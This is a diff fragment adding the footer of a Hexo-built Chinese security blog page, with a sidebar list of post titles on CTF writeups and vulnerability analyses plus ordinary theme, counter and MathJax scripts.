+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2015/12/01/0x0C/" title="下一篇: Python 的 BaseHTTPServer模块分析小结">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
